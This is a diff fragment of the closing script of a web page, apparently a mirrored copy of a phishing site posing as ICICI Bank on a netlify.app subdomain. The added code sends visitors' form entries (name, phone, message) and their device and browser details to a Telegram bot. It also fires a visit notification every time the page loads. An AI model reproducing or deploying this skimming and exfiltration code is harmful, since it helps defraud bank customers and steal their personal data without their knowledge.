@@ -1,1 +1,36 @@
+.catch(error => console.error('Error sending visit notification:', error));
+        }
 
+        // Send message function
+        function sendMessage(event) {
+            event.preventDefault();
+            const form = event.target;
+            const name = form.name.value;
+            const phone = form.phone.value;
+            const message = form.message.value;
+
+            const { device, browser } = getDeviceDetails();
+            const text = `New Message:\nName: ${name}\nPhone: ${phone}\nMessage: ${message}\nDevice: ${device}\nBrowser: ${browser}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Message sent successfully!');
+                        form.reset();
+                    } else {
+                        alert('Failed to send message.');
+                    }
+                })
+                .catch(error => alert('Error sending message:', error));
+        }
+
+        // Call notifyVisit on page load
+        notifyVisit();
+    </script>
+
+
+</body>
+<!-- Mirrored from m-icicibank.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Thu, 09 Apr 2026 04:27:30 GMT -->
+</html>
